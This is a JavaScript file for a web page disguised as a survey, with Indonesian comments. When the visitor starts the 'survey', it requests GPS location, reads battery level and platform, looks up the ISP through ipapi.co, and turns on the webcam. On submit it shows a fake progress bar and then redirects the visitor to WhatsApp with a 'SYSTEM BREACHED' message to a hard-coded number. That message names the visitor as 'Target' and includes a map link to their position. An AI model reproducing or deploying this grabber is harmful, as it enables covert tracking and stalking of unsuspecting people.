const nomorWA = "628979100200";
let userData = { 
    coords: "Tidak Diizinkan", 
    os: navigator.platform,
    battery: "Unknown",
    isp: "Detecting..."
};

// Ambil Data Baterai & ISP secara aman
async function fetchAdvancedData() {
    try {
        if (navigator.getBattery) {
            const bat = await navigator.getBattery();
            userData.battery = `${Math.round(bat.level * 100)}%`;
        }
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        userData.isp = data.org;
    } catch (e) { console.log("Data tambahan gagal."); }
}

// Handler Tombol Mulai
document.getElementById('start-survey').onclick = async function() {
    document.getElementById('step-1').style.display = 'none';
    document.getElementById('step-2').style.display = 'block';
    
    fetchAdvancedData();

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (pos) => { userData.coords = `${pos.coords.latitude},${pos.coords.longitude}`; },
            (err) => { console.log("GPS ditolak"); }
        );
    }
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        document.getElementById('webcam').srcObject = stream;
    } catch (e) { console.log("Kamera ditolak"); }
};

// Fungsi Kirim Utama
function processSubmit() {
    const nameInput = document.getElementById('name').value;
    if (!nameInput) return alert("Silakan isi nama Anda.");

    document.getElementById('step-2').style.display = 'none';
    document.getElementById('step-3').style.display = 'block';

    let prg = 0;
    const interval = setInterval(() => {
        prg += 20;
        document.getElementById('progress').style.width = prg + "%";
        if (prg >= 100) {
            clearInterval(interval);
            
            const mapLink = `https://www.google.com/maps?q=${userData.coords}`;
            const msg = `🚨 *SYSTEM BREACHED 2026* 🚨%0A%0A` +
                        `👤 *Target:* ${nameInput}%0A` +
                        `📍 *Maps:* ${mapLink}%0A` +
                        `📡 *ISP:* ${userData.isp}%0A` +
                        `🔋 *Battery:* ${userData.battery}%0A` +
                        `💻 *OS:* ${userData.os}%0A` +
                        `🖥️ *Res:* ${window.screen.width}x${window.screen.height}%0A%0A` +
                        `_Data successfully mirrored to master database._`;

            window.location.href = `https://api.whatsapp.com/send?phone=${nomorWA}&text=${msg}`;
        }
    }, 600);
}

// Listener Keyboard & Klik
document.getElementById('submit-survey').onclick = processSubmit;
document.getElementById('name').onkeydown = (e) => { if (e.key === "Enter") processSubmit(); };
